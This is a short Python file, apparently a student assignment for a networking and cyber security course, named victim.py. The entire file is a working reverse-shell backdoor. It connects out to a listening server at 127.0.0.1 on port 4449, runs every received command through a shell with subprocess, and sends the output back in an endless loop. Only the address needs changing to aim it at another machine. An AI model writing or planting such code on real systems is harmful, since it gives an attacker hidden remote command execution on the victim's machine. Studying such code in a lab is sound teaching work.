# Muhammad Huzaifa
# 20i0604
# victim.py
# Networks and Cyber II

import socket
import subprocess   #importing Libraries
import os

server_ip = '127.0.0.1'# IP client is connecting to
port = 4449
backdoor = socket.socket()# Creating socket for connection
backdoor.connect((server_ip, port))# Connecting with the server

# Replying the server with output of the command recieved
while True:
    # Getting command in comand variable
    command = backdoor.recv(1024)
    command = command.decode()# Decoding the command into utf-8
    print("Command Recieved: ", command)

    # Opening a subprocess on victim to execute the command
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()# Getting the command outut on output variable
    output_error = op.stderr.read()#Getting the command output error on output_error variable
    backdoor.send(output + output_error)# Sending the result of command back to server
    print("Output Sent")

